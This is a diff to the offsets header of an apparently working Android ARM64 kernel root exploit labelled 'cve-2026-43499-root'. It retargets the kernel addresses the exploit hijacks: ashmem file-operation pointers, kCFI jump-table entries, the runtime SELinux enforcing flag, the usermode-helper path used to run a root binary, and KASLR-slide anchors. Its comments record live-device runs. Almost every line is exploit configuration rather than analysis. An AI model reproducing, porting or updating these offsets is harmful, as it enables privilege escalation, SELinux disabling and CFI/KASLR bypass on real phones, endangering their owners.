@@ -40,16 +40,16 @@
 #define VMEMMAP_START    0xfffffffeffe00000ULL   /* 39-bit v5.10: -VMEMMAP_SIZE(0x1000000000)-2M; GDB-verified on live slab pages */
 
 /* ---- ashmem dispatch functions (CFI jump targets for v5.10 ARM64 Android) ---- */
-#define ASHMEM_MISC_FOPS_OFF 0x026ec728ULL   /* &ashmem_misc.fops */
-#define ASHMEM_FOPS_OFF      0x0207f160ULL   /* &ashmem_fops           */
+#define ASHMEM_MISC_FOPS_OFF 0x026ecd28ULL   /* &ashmem_misc.fops */
+#define ASHMEM_FOPS_OFF      0x02081478ULL   /* &ashmem_fops           */
 
 /* Function addresses (raw entry points) */
-#define ASHMEM_IOCTL_OFF         0x01145b20ULL   /* ashmem_ioctl           */
-#define ASHMEM_COMPAT_IOCTL_OFF  0x011465ecULL   /* compat_ashmem_ioctl    */
-#define ASHMEM_MMAP_OFF          0x01146644ULL   /* ashmem_mmap            */
-#define ASHMEM_OPEN_OFF          0x01146874ULL   /* ashmem_open            */
-#define ASHMEM_RELEASE_OFF       0x0114690cULL   /* ashmem_release         */
-#define ASHMEM_SHOW_FDINFO_OFF   0x01146a28ULL   /* ashmem_show_fdinfo     */
+#define ASHMEM_IOCTL_OFF         0x0114ab24ULL   /* ashmem_ioctl           */
+#define ASHMEM_COMPAT_IOCTL_OFF  0x0114b5f0ULL   /* compat_ashmem_ioctl    */
+#define ASHMEM_MMAP_OFF          0x0114b648ULL   /* ashmem_mmap            */
+#define ASHMEM_OPEN_OFF          0x0114b878ULL   /* ashmem_open            */
+#define ASHMEM_RELEASE_OFF       0x0114b910ULL   /* ashmem_release         */
+#define ASHMEM_SHOW_FDINFO_OFF   0x0114ba2cULL   /* ashmem_show_fdinfo     */
 
 /*
  * configfs — v5.10 uses old .read/.write API, not .read_iter/.write_iter.
@@ -63,23 +63,23 @@
  * .write slot MUST be configfs_write_bin_file.
  * Populate .read/.write (FOPS_READ_OFF=0x10, FOPS_WRITE_OFF=0x18).
  */
-#define CONFIGFS_READ_ITER_OFF      0x00602060ULL   /* configfs_read_file      */
-#define CONFIGFS_BIN_WRITE_ITER_OFF 0x006029f0ULL   /* configfs_write_bin_file */
+#define CONFIGFS_READ_ITER_OFF      0x006040d8ULL   /* configfs_read_file      */
+#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00604a68ULL   /* configfs_write_bin_file */
 
-#define COPY_SPLICE_READ_OFF  0x005364c0ULL   /* generic_file_splice_read */
-#define NOOP_LLSEEK_OFF       0x004c1654ULL   /* noop_llseek              */
+#define COPY_SPLICE_READ_OFF  0x0053866cULL   /* generic_file_splice_read */
+#define NOOP_LLSEEK_OFF       0x004c3694ULL   /* noop_llseek              */
 
 /* ---- Kernel data objects ---- */
 #define INIT_TASK_OFF           0x0259c000ULL   /* init_task           */
-#define ROOT_TASK_GROUP_OFF     0x0279b040ULL   /* root_task_group     */
+#define ROOT_TASK_GROUP_OFF     0x0279c040ULL   /* root_task_group     */
 /* Runtime enforce flag = selinux_state.enforcing @ +0x00
  * (selinux_state @ 0xffffffc00a8cccd8; offset verified via sel_write_enforce's
  * ldaprb/strb [x22]).  NOT selinux_enforcing_boot (0x02548484) — that one is
  * the boot-time value only; writing it changes nothing at runtime (the
  * 2026-08-08 device run's umh -EACCES: SELinux stayed enforcing). */
-#define SELINUX_ENFORCING_OFF   0x028cccd8ULL   /* selinux_state.enforcing */
-#define KMALLOC_CACHES_OFF      0x020c1080ULL   /* kmalloc_caches      */
-#define ANON_PIPE_BUF_OPS_OFF   0x01f021e8ULL   /* anon_pipe_buf_ops   */
+#define SELINUX_ENFORCING_OFF   0x028cdcd8ULL   /* selinux_state.enforcing */
+#define KMALLOC_CACHES_OFF      0x020c3660ULL   /* kmalloc_caches      */
+#define ANON_PIPE_BUF_OPS_OFF   0x01f040e8ULL   /* anon_pipe_buf_ops   */
 
 /* ---- Convenience macros (absolute addresses) ---- */
 #define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
@@ -102,7 +102,7 @@
 
 /* ---- Root usermodehelper ---- */
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
-#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x0010807cULL   /* GDB: &call_usermodehelper_exec_work - KIMAGE_TEXT_BASE */
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x001086b4ULL   /* GDB: &call_usermodehelper_exec_work - KIMAGE_TEXT_BASE */
 #define SYSTEM_UNBOUND_WQ_OFF 0x02589e08ULL               /* GDB: &system_unbound_wq - KIMAGE_TEXT_BASE */
 
 /* ---- kCFI canonical (.cfi_jt) addresses ---------------------------------
@@ -112,17 +112,17 @@
  * "CFI failure" otherwise (observed on the live target).
  * Values recovered by scanning the .cfi_jt region on the running kernel and
  * cross-checked against the real ashmem_fops table slots. */
-#define ASHMEM_IOCTL_JT_OFF           0x01145b20ULL   /* -> ashmem_ioctl            */
-#define ASHMEM_COMPAT_IOCTL_JT_OFF    0x011465ecULL   /* -> compat_ashmem_ioctl     */
-#define ASHMEM_MMAP_JT_OFF            0x01146644ULL   /* -> ashmem_mmap             */
-#define ASHMEM_OPEN_JT_OFF            0x01146874ULL   /* -> ashmem_open             */
-#define ASHMEM_RELEASE_JT_OFF         0x0114690cULL   /* -> ashmem_release          */
-#define ASHMEM_SHOW_FDINFO_JT_OFF     0x01146a28ULL   /* -> ashmem_show_fdinfo      */
-#define ASHMEM_LLSEEK_JT_OFF          0x01145980ULL   /* real table .llseek (ashmem_llseek) */
-#define CONFIGFS_READ_FILE_JT_OFF       0x00602060ULL /* -> configfs_read_file      */
-#define CONFIGFS_WRITE_BIN_FILE_JT_OFF  0x006029f0ULL /* -> configfs_write_bin_file */
-#define NOOP_LLSEEK_JT_OFF            0x004c1654ULL   /* -> noop_llseek             */
-#define CALL_USERMODEHELPER_EXEC_WORK_JT_OFF 0x0010807cULL /* -> call_usermodehelper_exec_work */
+#define ASHMEM_IOCTL_JT_OFF           0x0114ab24ULL   /* -> ashmem_ioctl            */
+#define ASHMEM_COMPAT_IOCTL_JT_OFF    0x0114b5f0ULL   /* -> compat_ashmem_ioctl     */
+#define ASHMEM_MMAP_JT_OFF            0x0114b648ULL   /* -> ashmem_mmap             */
+#define ASHMEM_OPEN_JT_OFF            0x0114b878ULL   /* -> ashmem_open             */
+#define ASHMEM_RELEASE_JT_OFF         0x0114b910ULL   /* -> ashmem_release          */
+#define ASHMEM_SHOW_FDINFO_JT_OFF     0x0114ba2cULL   /* -> ashmem_show_fdinfo      */
+#define ASHMEM_LLSEEK_JT_OFF          0x0114a984ULL   /* real table .llseek (ashmem_llseek) */
+#define CONFIGFS_READ_FILE_JT_OFF       0x006040d8ULL /* -> configfs_read_file      */
+#define CONFIGFS_WRITE_BIN_FILE_JT_OFF  0x00604a68ULL /* -> configfs_write_bin_file */
+#define NOOP_LLSEEK_JT_OFF            0x004c3694ULL   /* -> noop_llseek             */
+#define CALL_USERMODEHELPER_EXEC_WORK_JT_OFF 0x001086b4ULL /* -> call_usermodehelper_exec_work */
 
 #define ASHMEM_IOCTL_JT        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_JT_OFF)
 #define ASHMEM_COMPAT_IOCTL_JT (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_JT_OFF)
@@ -171,12 +171,12 @@
 #define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
 #define SLIDE_TRACEFS_EVENT_ID 84
 
-#define SLIDE_NFULNL_LOGGER_OFF        0x02591340ULL
-#define SLIDE_LOGGERS_0_1_OFF          0x02591270ULL   /* &loggers[0][1] */
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF  0x026ac628ULL   /* &random_table[4].data */
+#define SLIDE_NFULNL_LOGGER_OFF        0x02591348ULL
+#define SLIDE_LOGGERS_0_1_OFF          0x02591278ULL   /* &loggers[0][1] */
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF  0x026acb50ULL   /* &random_table[4].data */
 #define SLIDE_INIT_TASK_OFF            INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF      ROOT_TASK_GROUP_OFF
-#define SLIDE_SYSCTL_BOOTID_OFF        0x0296cdc5ULL   /* sysctl_bootid buffer */
+#define SLIDE_SYSCTL_BOOTID_OFF        0x0296dd45ULL   /* sysctl_bootid buffer */
 
 #define SLIDE_NFULNL_LOGGER_IMAGE \
   (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
@@ -196,7 +196,7 @@
  * Used by slide.c to match trace event callers during KASLR bypass.
  * WARNING: QEMU nokaslr — verify empirically if trace-based slide is used.
  */
-#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x001124a8ULL   /* worker_thread+1368 ret addr after bl schedule */
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00112ae0ULL   /* worker_thread+1368 ret addr after bl schedule */
 
 /* ---- Fake page layout offsets (within the 32KB order-3 kernel page) ---- */
 #define LOCK_OFF    0x1350
